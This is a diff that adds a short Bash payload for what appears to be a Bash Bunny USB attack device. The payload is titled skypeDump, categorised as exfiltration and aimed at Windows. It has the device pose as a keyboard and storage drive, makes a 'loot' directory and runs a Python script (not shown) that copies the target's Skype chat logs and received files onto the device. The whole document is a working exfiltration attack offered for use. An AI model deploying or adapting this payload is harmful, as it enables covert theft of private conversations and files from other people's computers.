@@ -1,0 +1,33 @@
+#!/bin/bash
+#
+# Title:         skypeDump
+# Description:   Runs a python script to grab the local files from a Skype installation including received files and chat logs
+# Author:        Secure Snake
+# Version:       0.1
+# Category:      Exfiltration
+# Target:        Windows
+
+
+# Setup loot directory and working directory
+LOOTDIR="/root/udisk/loot/skypeDump"
+mkdir -p $LOOTDIR
+
+#Give it a sec to create
+DELAY 200
+
+# Attack setup
+LED R B
+#ATTACKMODE RNDIS_ETHERNET
+ATTACKMODE HID STORAGE
+
+GET SWITCH_POSITION
+
+cd /root/udisk/loot/skypeDump
+
+
+# Do the attack
+LED G R 100
+python /root/udisk/payloads/$SWITCH_POSITION/skypeDump.py >> $LOOTDIR/log.txt
+
+# Finished
+LED G
